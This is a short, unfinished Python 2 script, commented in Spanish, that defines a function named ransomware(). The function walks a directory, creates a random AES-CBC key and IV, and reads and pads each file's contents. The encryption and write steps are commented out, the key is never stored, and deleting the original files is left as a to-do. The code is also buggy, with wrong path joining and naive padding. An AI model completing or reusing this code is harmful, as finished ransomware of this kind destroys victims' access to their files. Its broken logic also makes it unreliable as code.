# -*- coding: UTF-8 -*-
from Crypto.Cipher import AES
import os

###################################
##Encriptamos el objeto           #
#ciphertext = obj.encrypt(message)#
###################################

def ransomware():
        baseUrl= '/home/rem/Escritorio/proof/'
        extensions = []                         #Posible extensions of files to fuck hard 
        key = os.urandom(16)                    #Key 16 bytes
        iv = os.urandom(16)                     #Initial Value 16 bytes
        obj = AES.new(key, AES.MODE_CBC, iv)    #Creamos el cifrador

        """Busca recursivamente todos los ficheros, la raiz y los directorios"""
        for root, directories, filenames in os.walk(baseUrl):

            """Para cada archivo dentro de esa lista... ->"""
            for file in filenames:
				infile = os.path.join(root+file)
				outfile, ext = os.path.splitext(file)
				outfile = os.path.join(root+file+'.enc')
				filesize = os.path.getsize(infile)
				
				print infile, outfile, filesize
				
				"""-> Leelo y... ->"""
				read_in = open(infile,'rb')
				lineas = read_in.readlines(16)
				"""-> Si tiene menos de 16 caracteres, rellenalo con espacios...->""" #Esto se debe a que el mínimo de caracteres a encriptar ha de ser un múltiplo de 16
				for linea in lineas:
					if len(linea)<16:
						long = len(linea)
						nulls = 16-long
						linea += (' ' * nulls)
					print len(linea),'\t',linea
					
									
				#ciphertext = obj.encrypt(linea_in)
				#outfile.write(ciphertext)
				"""ELIMINAR EL ARCHIVO QUE SOBRA"""

ransomware()
